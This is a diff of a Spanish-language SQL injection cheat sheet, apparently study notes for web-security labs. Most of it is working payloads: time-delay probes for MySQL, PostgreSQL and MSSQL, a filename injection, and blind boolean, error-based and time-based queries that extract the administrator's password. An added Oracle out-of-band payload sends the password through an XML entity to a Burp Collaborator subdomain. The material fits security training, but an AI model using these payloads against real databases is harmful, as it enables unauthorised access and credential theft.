@@ -9,10 +9,19 @@
 ```sql
 '
 "
+'%3b select sleep(5)--
 ' or sleep(5)--
 '||pg_sleep(5)--
 '; waitfor delay '0:0:5'--
 ```
+--- 
+## Payloads 
+
+```sql
+poc.js'+(select*from(select(sleep(40)))a)+'.pdf
+
+```
+
 
 ---
 # **SQLi**  
@@ -134,40 +143,50 @@ id=32' union select username,password from users-- -
 ## **BSQLi**
 ## **Enumeracion basada en nested queries**
 
-### MySQL
-**Enumeracion de contraeñas**
+**MySQL**
+*Enumeracion de contraeñas*
 ```sql
 id=32' and (select substring(password,1,1) from users where username='administrator')='a'-- -
 ```
 
-**Enumeracion de longitud de contraseña**
+*Enumeracion de longitud de contraseña*
 ```sql
 id=32' and (select 'a' from users where username='administrator' and length(password)>10)='a'-- -
 ```
 
-### Oracle
-**Enumeracion de contraeñas**
+**Oracle**
+*Enumeracion de contraeñas*
 ```sql
 id=32'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
 ```
 
-**Enumeracion de longitud de contraseña**
+*Enumeracion de longitud de contraseña*
 ```sql
 id=32'||(select case when length(password)>20 then to_char(1/0) else '' end from users where username='administrator')||'
 ```
 
 ## Enumeracion basada en retrasos de tiempo
 
-### PostgreSQL
-**Enumeracion de longitud de contraseña**
+**PostgreSQL**
+*Enumeracion de longitud de contraseña*
 ```sql
 id=32'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- 
 ```
 
-**Enumeracion de contraeñas**
+*Enumeracion de contraeñas*
 ```sql
 id=32'%3b select case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- 
 ```
+
+## Enumeracion basada en OOB
+*Buscar los payloads en la cheat sheet de portswigger*
+
+**Oracle**
+```sql 
+id=32' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- 
+```
+
+
 ---
 ## **Automatización con SQLMap**  
 
